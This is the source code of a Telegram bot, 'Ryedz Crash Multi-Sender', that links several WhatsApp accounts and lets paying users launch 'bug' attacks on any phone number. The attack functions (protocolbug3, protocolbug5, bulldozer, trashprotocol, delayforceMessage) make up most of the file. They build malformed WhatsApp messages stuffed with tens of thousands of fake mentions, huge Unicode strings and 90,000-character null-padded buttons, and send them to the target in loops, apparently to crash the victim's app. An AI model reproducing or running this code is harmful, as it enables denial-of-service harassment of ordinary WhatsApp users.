const {
  Telegraf,
  Markup,
  session
} = require("telegraf");
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const {
  BOT_TOKEN
} = require("./config");

// --------------------- KONFIGURASI DATABASE & FOLDER ---------------------
const DB_DIR = "./database";
const SESSIONS_DIR = path.join(DB_DIR, "sessions");

const premiumFile = path.join(DB_DIR, "premiumuser.json");
const ownerFile = path.join(DB_DIR, "owneruser.json");
const SESSIONS_FILE = path.join(DB_DIR, "sessions.json");

// Pastikan folder database dan sessions ada
if (!fs.existsSync(DB_DIR)) {
  fs.mkdirSync(DB_DIR, { recursive: true });
}
if (!fs.existsSync(SESSIONS_DIR)) {
  fs.mkdirSync(SESSIONS_DIR, { recursive: true });
}

// --------------------- INISIALISASI BOT ---------------------
const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

let isWhatsAppConnected = false;
let sessions = new Map(); // Menyimpan instance socket aktif: Map<Number, Socket>

const blacklist = ["0", "0", "0"];
const randomImages = [
  "https://files.catbox.moe/cd30rt.jpg"
];

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

const getUptime = () => {
  const uptime = process.uptime();
  const hours = Math.floor(uptime / 3600);
  const minutes = Math.floor(uptime % 3600 / 60);
  const seconds = Math.floor(uptime % 60);
  return `${hours}h ${minutes}m ${seconds}s`;
};

// --------------------- DATABASE MANAGEMENT ---------------------

const loadJSON = (filePath) => {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify([], null, 2)); // Buat file jika belum ada
    return [];
  }
  return JSON.parse(fs.readFileSync(filePath, "utf8"));
};

const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

let ownerUsers = loadJSON(ownerFile);
let premiumUsers = loadJSON(premiumFile);

// --------------------- MULTI-SENDER FUNCTIONS ---------------------

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `session_${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

function saveActiveSessions() {
  const activeNumbers = Array.from(sessions.keys());
  saveJSON(SESSIONS_FILE, activeNumbers);
}

function loadActiveSessions() {
  if (fs.existsSync(SESSIONS_FILE)) {
    return JSON.parse(fs.readFileSync(SESSIONS_FILE, "utf8"));
  }
  return [];
}

async function initializeWhatsAppConnections() {
  try {
    const activeNumbers = loadActiveSessions();
    if (activeNumbers.length === 0) return;

    console.log(chalk.yellow(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif, Menghubungkan...`));

    for (const botNumber of activeNumbers) {
      console.log(`Menghubungkan ulang WhatsApp: ${botNumber}`);
      const sessionDir = createSessionDir(botNumber);
      const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("creds.update", saveCreds);

      await new Promise((resolve) => {
        const timeout = setTimeout(() => {
          resolve(); // Skip jika timeout
        }, 20000);

        sock.ev.on("connection.update", async (update) => {
          const { connection, lastDisconnect } = update;
          if (connection === "open") {
            clearTimeout(timeout);
            console.log(chalk.green(`Bot ${botNumber} terhubung!`));
            sessions.set(botNumber, sock);
            isWhatsAppConnected = true;
            resolve();
          } else if (connection === "close") {
            clearTimeout(timeout);
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (!shouldReconnect) {
              console.log(chalk.red(`Sesi ${botNumber} sudah logout, menghapus sesi...`));
              fs.rmSync(sessionDir, { recursive: true, force: true });
            }
            resolve();
          }
        });
      });
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `📋 *𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐏𝐀𝐈𝐑𝐈𝐍𝐆*\n✦ 𝐍𝐎𝐌𝐎𝐑  : 「 ${botNumber} 」\n   └ 𝐒𝐓𝐀𝐓𝐔𝐒 : Instalasi...`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    version,
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `📋 *𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐏𝐀𝐈𝐑𝐈𝐍𝐆*\n✦ 𝐍𝐎𝐌𝐎𝐑  : 「 ${botNumber} 」\n   └ 𝐒𝐓𝐀𝐓𝐔𝐒 : Try Connect...`,
          { chat_id: chatId, message_id: statusMessage, parse_mode: "Markdown" }
        );
        connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `📋 *𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐏𝐀𝐈𝐑𝐈𝐍𝐆*\n✦ 𝐍𝐎𝐌𝐎𝐑  : 「 ${botNumber} 」\n   └ 𝐒𝐓𝐀𝐓𝐔𝐒 : GAGAL TERHUBUNG / LOGOUT`,
          { chat_id: chatId, message_id: statusMessage, parse_mode: "Markdown" }
        );
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      isWhatsAppConnected = true;
      saveActiveSessions();
      await bot.editMessageText(
        `📋 *𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐏𝐀𝐈𝐑𝐈𝐍𝐆*\n✦ 𝐍𝐎𝐌𝐎𝐑  : 「 ${botNumber} 」\n   └ 𝐒𝐓𝐀𝐓𝐔𝐒 : Berhasil Tersambung ✅`,
        { chat_id: chatId, message_id: statusMessage, parse_mode: "Markdown" }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `📋 *𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐏𝐀𝐈𝐑𝐈𝐍𝐆*\n✦ 𝐍𝐎𝐌𝐎𝐑  : 「 ${botNumber} 」\n   └ 𝐒𝐓𝐀𝐓𝐔𝐒 : PAIRING\n   └ *Kode:* ${formattedCode}`,
            { chat_id: chatId, message_id: statusMessage, parse_mode: "Markdown" }
          );
        }
      } catch (error) {
        await bot.editMessageText(
          `📋 *𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐏𝐀𝐈𝐑𝐈𝐍𝐆*\n✦ 𝐍𝐎𝐌𝐎𝐑  : 「 ${botNumber} 」\n   └ 𝐒𝐓𝐀𝐓𝐔𝐒 : EROR❗\n   └ Pesan: ${error.message}`,
          { chat_id: chatId, message_id: statusMessage, parse_mode: "Markdown" }
        );
      }
    }
  });

  return sock;
}

// --------------------- MIDDLEWARE ---------------------

const checkOwner = (ctx, next) => {
  if (!ownerUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("⛔ Anda bukan owner.");
  }
  next();
};

const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❌ Anda bukan pengguna premium.");
  }
  next();
};

const checkWhatsAppConnection = (ctx, next) => {
  if (sessions.size === 0) {
    return ctx.reply("❌ Belum ada WhatsApp yang terhubung. Silakan tambahkan sender terlebih dahulu.");
  }
  next();
};

// --------------------- TELEGRAM COMMANDS ---------------------

bot.command("start", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (blacklist.includes(userId)) {
    return ctx.reply("⛔ Anda telah masuk daftar blacklist.");
  }
  
  const caption = "```\n╔─═⊱  Ryedz official🥷🏻  ─═⬡\n║│ Versi : 2.0 (Multi-Sender)\n║ Runtime : " + getUptime() + "\n║ Sender Aktif : " + sessions.size + "\n┗━━━━━━━━━━━━━━━⬡\n╔─═──═──═───═──═⬡\n║/easybug\n║/mediumbug\n║/hardbug\n║/godbug\n┗━━━━━━━━━━━━━━━⬡\n╔─═──═──═───═──═⬡\n║/addsender 62***\n║/delsender 62***\n║/listsender\n║/cekprem\n║/restart\n║/addprem\n║/delpremium\n┗━━━━━━━━━━━━━━━⬡```";
    
  await ctx.replyWithPhoto(getRandomImage(), {
    caption: caption,
    parse_mode: "Markdown",
    ...Markup.inlineKeyboard([[Markup.button.url("OWNER", "https://t.me/reppdevvRyedz")]])
  });
});

// Fitur Tambahan untuk Multi-Sender
bot.command("addsender", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Masukkan nomor yang ingin ditambahkan.\nContoh: /addsender 62812345678");
  }
  
  let botNumber = args[1].replace(/[^0-9]/g, "");
  if (!botNumber.startsWith("62")) {
    return ctx.reply("❌ Nomor harus diawali dengan 62 (Indonesia).");
  }
  
  if (sessions.has(botNumber)) {
    return ctx.reply("✅ Nomor tersebut sudah terhubung sebagai sender.");
  }
  
  ctx.reply(`🔄 Memulai proses pairing untuk ${botNumber}...`);
  await connectToWhatsApp(botNumber, ctx.chat.id);
});

bot.command("delsender", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Masukkan nomor yang ingin dihapus.\nContoh: /delsender 62812345678");
  }
  
  let botNumber = args[1].replace(/[^0-9]/g, "");
  
  if (!sessions.has(botNumber)) {
    return ctx.reply("❌ Nomor tersebut tidak terdaftar sebagai sender aktif.");
  }
  
  sessions.delete(botNumber);
  const sessionDir = createSessionDir(botNumber);
  if (fs.existsSync(sessionDir)) {
    fs.rmSync(sessionDir, { recursive: true, force: true });
  }
  
  saveActiveSessions();
  if (sessions.size === 0) isWhatsAppConnected = false;
  
  ctx.reply(`🚫 Berhasil menghapus dan memutuskan sender ${botNumber}.`);
});

bot.command("listsender", checkOwner, async (ctx) => {
  if (sessions.size === 0) {
    return ctx.reply("📭 Tidak ada sender yang sedang aktif.");
  }
  
  let listText = "📋 *SENDER AKTIF*\nTotal: " + sessions.size + " Bot\n\n";
  let no = 1;
  for (const [num] of sessions.entries()) {
    listText += `${no}. ${num}\n`;
    no++;
  }
  
  ctx.reply(listText, { parse_mode: "Markdown" });
});

// --------------------- BUG COMMANDS ---------------------

bot.command("easybug", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const targetNumber = ctx.message.text.split(" ")[1];
  if (!targetNumber) return ctx.reply("Example:\n\n/easybug 628XXXX");
  
  let cleanNumber = targetNumber.replace(/[^0-9]/g, "");
  let jid = cleanNumber + "@s.whatsapp.net";
  
  await ctx.reply(`🚀 Mengirim Easy Bug ke ${cleanNumber} menggunakan ${sessions.size} sender...`);
  
  for (const [num, sock] of sessions.entries()) {
    for (let i = 0; i < 30; i++) {
      await delayforceMessage(sock, jid);
    }
  }
  ctx.reply("✅ Pengiriman Easy Bug selesai.");
});

bot.command("mediumbug", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const targetNumber = ctx.message.text.split(" ")[1];
  if (!targetNumber) return ctx.reply("Example:\n\n/mediumbug 628XXXX");
  
  let cleanNumber = targetNumber.replace(/[^0-9]/g, "");
  let jid = cleanNumber + "@s.whatsapp.net";
  
  await ctx.reply(`🚀 Mengirim Medium Bug ke ${cleanNumber} menggunakan ${sessions.size} sender...`);
  
  for (const [num, sock] of sessions.entries()) {
    for (let i = 0; i < 30; i++) {
      await trashprotocol(sock, jid);
    }
  }
  ctx.reply("✅ Pengiriman Medium Bug selesai.");
});

bot.command("hardbug", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const targetNumber = ctx.message.text.split(" ")[1];
  if (!targetNumber) return ctx.reply("Example:\n\n/hardbug 628XXXX");
  
  let cleanNumber = targetNumber.replace(/[^0-9]/g, "");
  let jid = cleanNumber + "@s.whatsapp.net";
  
  await ctx.reply(`🚀 Mengirim Hard Bug ke ${cleanNumber} menggunakan ${sessions.size} sender...`);
  
  for (const [num, sock] of sessions.entries()) {
    for (let i = 0; i < 30; i++) {
      await bulldozer(sock, jid);
    }
  }
  ctx.reply("✅ Pengiriman Hard Bug selesai.");
});

bot.command("godbug", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const targetNumber = ctx.message.text.split(" ")[1];
  if (!targetNumber) return ctx.reply("Example:\n\n/godbug 628XXXX");
  
  let cleanNumber = targetNumber.replace(/[^0-9]/g, "");
  let jid = cleanNumber + "@s.whatsapp.net";
  
  await ctx.reply(`🚀 Mengirim God Bug ke ${cleanNumber} menggunakan ${sessions.size} sender...`);
  
  for (const [num, sock] of sessions.entries()) {
    for (let i = 0; i < 25; i++) {
      await protocolbug5(sock, jid);
      await protocolbug3(sock, jid);
    }
  }
  ctx.reply("✅ Pengiriman God Bug selesai.");
});

// --------------------- PREMIUM & OWNER COMMANDS ---------------------

bot.command("addprem", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("❌ Contoh: /addprem 123456789");
  const userId = args[1];
  if (premiumUsers.includes(userId)) return ctx.reply("✅ Pengguna sudah premium.");
  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);
  ctx.reply(`🎉 Pengguna ${userId} sekarang premium!`);
});

bot.command("delprem", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("❌ Contoh: /delprem 123456789");
  const userId = args[1];
  if (!premiumUsers.includes(userId)) return ctx.reply("❌ Pengguna tidak ada di daftar premium.");
  premiumUsers = premiumUsers.filter(id => id !== userId);
  saveJSON(premiumFile, premiumUsers);
  ctx.reply(`🚫 Pengguna ${userId} dihapus dari premium.`);
});

bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();
  ctx.reply(premiumUsers.includes(userId) ? "✅ Anda pengguna premium." : "❌ Anda bukan pengguna premium.");
});

bot.command("restart", checkOwner, (ctx) => {
  ctx.reply("Merestart bot...");
  process.exit(1); 
});

// --------------------- BUG PROTOCOL FUNCTIONS ---------------------

async function protocolbug3(sock, target, mention) {
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4", fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
          fileLength: "999999", seconds: 999999, mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
          caption: "\u9999", height: 999999, width: 999999,
          fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
          directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1743742853",
          contextInfo: { isSampled: true, mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)] },
          streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
          thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
          thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=", thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
          annotations: [{ embeddedContent: { embeddedMusic: { musicContentMediaId: "kontol", songId: "peler", author: "\u9999", title: "\u9999", artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0", artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=", artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=", artistAttribution: "https://www.instagram.com/_u/tamainfinity_", countryBlocklist: true, isExplicit: true, artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ=" } }, embeddedAction: null }]
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, { messageId: msg.key.id, statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }] });
  if (mention) { await sock.relayMessage(target, { groupStatusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } } }, { additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }] }); }
}

async function protocolbug5(sock, isTarget, mention) {
  const mentionedList = ["13135550002@s.whatsapp.net", ...Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)];
  const embeddedMusic = { musicContentMediaId: "589608164114571", songId: "870166291800508", author: ".Tama Ryuichi" + "႐ administrations".repeat(10000), title: "Finix", artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0", artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=", artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=", artistAttribution: "https://www.instagram.com/_u/tamainfinity_", countryBlocklist: true, isExplicit: true, artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=" };
  const videoMessage = { url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true", mimetype: "video/mp4", fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=", fileLength: "289511", seconds: 15, mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=", caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌃𐌂𐌖𐌄𐍂𐍂𐍉𐍂", height: 640, width: 640, fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=", directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0", mediaKeyTimestamp: "1743848703", contextInfo: { isSampled: true, mentionedJid: mentionedList }, forwardedNewsletterMessageInfo: { newsletterJid: "120363321780343299@newsletter", serverMessageId: 1, newsletterName: "gong❗" }, streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=", thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0", thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=", thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=", annotations: [{ embeddedContent: { embeddedMusic }, embeddedAction: true }] };
  const msg = generateWAMessageFromContent(isTarget, { viewOnceMessage: { message: { videoMessage } } }, {});

  await sock.relayMessage("status@broadcast", msg.message, { messageId: msg.key.id, statusJidList: [isTarget], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }] }] }] });
  if (mention) { await sock.relayMessage(isTarget, { groupStatusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } } }, { additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }] }); }
}

async function bulldozer(sock, isTarget) {
  let message = { viewOnceMessage: { message: { stickerMessage: { url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true", fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=", fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=", mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=", mimetype: "image/webp", directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0", fileLength: { low: 1, high: 0, unsigned: true }, mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false }, firstFrameLength: 19904, firstFrameSidecar: "KN4kQ5pyABRAgA==", isAnimated: true, contextInfo: { mentionedJid: ["0@s.whatsapp.net", ...Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")], groupMentions: [], entryPointConversionSource: "non_contact", entryPointConversionApp: "whatsapp", entryPointConversionDelaySeconds: 467593 }, stickerSentTs: { low: -1939477883, high: 406, unsigned: false }, isAvatar: false, isAiSticker: false, isLottie: false } } };
  const msg = generateWAMessageFromContent(isTarget, message, {});
  await sock.relayMessage("status@broadcast", msg.message, { messageId: msg.key.id, statusJidList: [isTarget], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }] }] }] });
}

async function trashprotocol(sock, target, mention) {
  const mentionedList = ["13135550002@s.whatsapp.net", ...Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 2000000)}@s.whatsapp.net`)];
  const videoMessage = { url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true", mimetype: "video/mp4", fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=", fileLength: "289511", seconds: 15, mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=", height: 640, width: 640, fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=", directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0", mediaKeyTimestamp: "1743848703", contextInfo: { isSampled: true, mentionedJid: mentionedList }, annotations: [], thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0", thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=", thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=" };
  const msg = generateWAMessageFromContent(target, { viewOnceMessage: { message: { videoMessage } } }, {});

  await sock.relayMessage("status@broadcast", msg.message, { messageId: msg.key.id, statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }] });
  if (mention) { await sock.relayMessage(target, { groupStatusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } } }, { additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }] }); }
}

async function delayforceMessage(sock, target) {
  let payload = {
    viewOnceMessage: {
      message: {
        messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
        interactiveMessage: {
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            quotedMessage: { documentMessage: { url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true", mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation", fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=", fileLength: "9999999999999", pageCount: 35675873277, mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=", fileName: "Ryedz official", fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=", directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0", mediaKeyTimestamp: "1735456100", contactVcard: true, caption: "Ryedz official" } }
          },
          body: { text: "Ryedz official" + "ꦾ".repeat(10000) },
          nativeFlowMessage: { buttons: [{ name: "single_select", buttonParamsJson: "\0".repeat(90000) }, { name: "call_permission_request", buttonParamsJson: "\0".repeat(90000) }, { name: "cta_url", buttonParamsJson: "\0".repeat(90000) }, { name: "cta_call", buttonParamsJson: "\0".repeat(90000) }, { name: "cta_copy", buttonParamsJson: "\0".repeat(90000) }, { name: "cta_reminder", buttonParamsJson: "\0".repeat(90000) }, { name: "cta_cancel_reminder", buttonParamsJson: "\0".repeat(90000) }, { name: "address_message", buttonParamsJson: "\0".repeat(90000) }, { name: "send_location", buttonParamsJson: "\0".repeat(90000) }, { name: "quick_reply", buttonParamsJson: "\0".repeat(90000) }, { name: "mpm", buttonParamsJson: "\0".repeat(90000) }] }
        }
      }
    }
  };
  await sock.relayMessage(target, payload, { participant: { jid: target } });
}

// --------------------- INITIALIZE BOT ---------------------

(async () => {
  console.clear();
  console.log(chalk.bold.red("\nRyedz Crash Multi-Sender"));
  console.log(chalk.bold.white("VERSION: 2.0"));
  
  // Muat ulang semua sesi yang pernah tersimpan
  await initializeWhatsAppConnections();
  
  bot.launch();
  
  console.log(chalk.bold.white("STATUS: ") + chalk.bold.green("ONLINE"));
  console.log(chalk.bold.white("SENDERS AKTIF: ") + chalk.bold.green(sessions.size));
  console.log(chalk.bold.yellow("THANKS FOR BUYING THIS SCRIPT FROM OWNER\n"));
})();